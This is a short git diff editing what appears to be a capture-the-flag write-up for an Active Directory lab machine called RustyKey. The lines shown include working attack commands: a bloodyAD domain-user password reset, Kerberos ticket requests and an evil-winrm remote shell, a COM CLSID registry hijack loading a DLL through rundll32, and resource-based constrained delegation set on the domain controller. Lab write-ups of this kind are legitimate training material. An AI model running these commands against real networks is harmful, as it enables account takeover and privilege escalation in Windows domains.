@@ -102,7 +102,7 @@ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rus<pass>
 ```
 
 ```bash
-bloodyAD --dc-ip $ip --host dc.rustykey.htb -d rustykey.htb -k set password 'ee.reed' 'Password123'
+bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rus<pass>' -k set password EE.REED 'Password123'
 [+] Password changed successfully!
 ```
 
@@ -143,9 +143,6 @@ sudo nano /etc/krb5.conf
 ```bash
 impacket-getTGT 'RUSTYKEY.HTB/BB.MORGAN:Password1234'
 export KRB5CCNAME=BB.MORGAN.ccache
-```
-```bash
-evil-winrm -i dc.rustykey.htb -r RUSTYKEY.HTB
 ```
 ```bash
 └─$ evil-winrm -i dc.rustykey.htb -r RUSTYKEY.HTB
@@ -206,7 +203,7 @@ reg add "HKLM\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\Inpr
 rundll32.exe C:\\programdata\\x.dll,DllRegisterServer
 ```
 
-## RBCD
+## RBCD with mm.turner
 
 ```bash
 Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
